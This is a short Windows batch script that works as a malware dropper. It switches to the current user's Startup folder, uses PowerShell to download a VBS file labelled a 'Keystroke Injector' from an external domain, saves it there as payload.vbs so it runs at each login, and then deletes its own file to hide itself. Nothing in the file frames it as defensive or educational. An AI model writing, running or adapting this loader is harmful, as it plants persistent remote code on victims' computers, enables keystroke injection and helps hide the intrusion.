@echo off

SET currentDirectory=%cd%
SET TARGETDIR="C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
@REM SET TargetLocToGetFile=C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
@REM SET TargetFile="%currentDirectory%\module_downloader.cmd"

cd %TARGETDIR%

@REM -------------------------------------------------------------------------------------------------------------------------------------

@REM download Keystroke Injector
powershell "Invoke-WebRequest -Uri 'https://arth.imbeddex.com/hello.vbs' -OutFile payload.vbs"
@REM payload.vbs


@REM -------------------------------------------------------------------------------------------------------------------------------------

cd %currentDirectory%
del module_downloader.cmd